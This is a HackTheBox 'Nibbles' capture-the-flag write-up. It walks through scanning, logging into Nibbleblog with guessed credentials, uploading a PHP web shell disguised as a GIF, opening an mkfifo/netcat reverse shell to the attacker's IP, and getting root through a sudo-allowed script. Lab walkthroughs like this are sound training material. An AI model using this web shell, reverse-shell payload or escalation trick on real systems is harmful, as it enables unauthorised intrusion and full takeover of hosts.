# HTB - Nibbles
## OS - Linux

I started with an nmap scan as usual. IP address of Nibbles is 10.10.10.75.

```$nmap -sC -sV -oN nibbles.nmap 10.10.10.75
Starting Nmap 7.80 ( https://nmap.org ) at 2021-01-11 16:40 PST
Nmap scan report for 10.10.10.75
Host is up (0.092s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.87 seconds
```
 
Ports 22 and 80 are open. 

I browsed to the index page of the web site. There was only "Hello World" there. That seemed odd, so I viewed source. It had a comment.

```
<!-- /nibbleblog/ directory. Nothing interesting here! -->
```

Went to http://10.10.10.75/nibbleblog. There was a blog post and some links but nothing seemed interesting. It was "powered by nibbleblog".

I ran dirbuster to find any files, but got nothing other than the icons folder. WHile that is going, I searched about nibbleblog.

I haven't heard of nibbleblog, but the source code is at https://github.com/dignajar/nibbleblog. There is no default password.

I also see a link - https://wikihak.com/how-to-upload-a-shell-in-nibbleblog-4-0-3/. Once we login, we can inject our own php shell and run commands.


Tring a bunch of passwords 5 times makes us blacklisted. So we have to wait until it is cleared. After a few tries, I looked up online and found the credentials were admin/nibbles.

After logging into the admin dashboard at http://10.10.10.75/nibbleblog/admin.php, browse to plugins folder and try to upload a php reverse shell using "My image". Something like this:
http://10.10.10.75/nibbleblog/admin.php?controller=plugins&action=config&plugin=my_image

Tried using a simple php command like:
```
GIF8;
<?php echo system($_REQUEST['cmd']); ?>
```
When I uploaded this image, I got some warnings, but when I browsed to 
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/image.php?cmd=id, I see

```
GIF8; uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler) uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

So cmd injection worked. 

Now instead of the id command, changed the GET request to POST in Burp Repeater, and tried the following arg to get a reverse shell.

rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.26+1234+>/tmp/f

On the nc listener, I see I got a response.

```
$nc -lvnp 1234
listening on [any] 1234 ...

connect to [10.10.14.26] from (UNKNOWN) [10.10.10.75] 43960
/bin/sh: 0: can't access tty; job control turned off
$ $
```

Then it's time to browse to the user's home folder to get the flag.

```
$ which python
$ python3 -c 'import pty;pty.spawn("/bin/bash")'
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ ls
ls
db.xml	image.php
nibbler@Nibbles:/var/www/html/nibbleblog/content/private/plugins/my_image$ cd /home/nibbler
nibbler@Nibbles:/home/nibbler$ ls
personal  personal.zip	user.txt
nibbler@Nibbles:/home/nibbler$ cat user.txt
```

To get root access, I first try "sudo -l".

```
nibbler@Nibbles:/home/nibbler$ sudo -l
sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh
```

nibbler can run a ~/personal/stuff/monitor.sh script as root. We can use this to get a bash shell.
We create a monitor.sh script in that folder. vi is tricky because pressing escape doesn't escape out of insert mode. So I had to connect back through nc again, and this time, tried 
```
echo "bash" > monitor.sh
```
That did not work and I could not edit the script through nc. So I created a monitor.sh on my attacker host with the content:
```
#!/bin/sh
bash
```
and ran SimpleHTTPServer to wget the file.

Then 
chmod +x monitor.sh

and 

sudo ./monitor.sh

```
nibbler@Nibbles:/home/nibbler/personal/stuff$ sudo ./monitor.sh
sudo ./monitor.sh
sudo: unable to resolve host Nibbles: Connection timed out
root@Nibbles:/home/nibbler/personal/stuff# ls
ls
monitor.sh
root@Nibbles:/home/nibbler/personal/stuff# cd /root
cd /root
root@Nibbles:~# ls
ls
root.txt
root@Nibbles:~# cat root.txt
```


